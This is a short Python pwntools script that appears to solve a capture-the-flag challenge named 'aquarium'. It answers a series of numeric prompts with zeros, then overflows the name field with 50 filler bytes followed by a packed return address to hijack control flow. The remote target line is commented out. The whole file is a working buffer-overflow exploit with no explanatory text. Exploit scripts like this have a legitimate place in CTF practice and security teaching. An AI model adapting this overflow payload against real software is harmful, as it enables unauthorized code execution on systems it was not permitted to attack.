from pwn import *
import struct

def p(x):
    return struct.pack("I", x)

r = process("./aquarium")
# r = remote("shell.actf.co", 19305)
print(r.recvuntil(":"))

# Number of fish
r.sendline("0")
print(r.recvuntil(":"))

# Size of fish
r.sendline("0")
print(r.recvuntil(":"))

# Amount of water
r.sendline("0")
print(r.recvuntil(":"))

# Width
r.sendline("0")
print(r.recvuntil(":"))

# Length
r.sendline("0")
print(r.recvuntil(":"))

# Height
r.sendline("0")
print(r.recvuntil(":"))

# Name!!!!!
r.sendline("A" * 50 + pack(0x4011b6))
print(r.recvall())
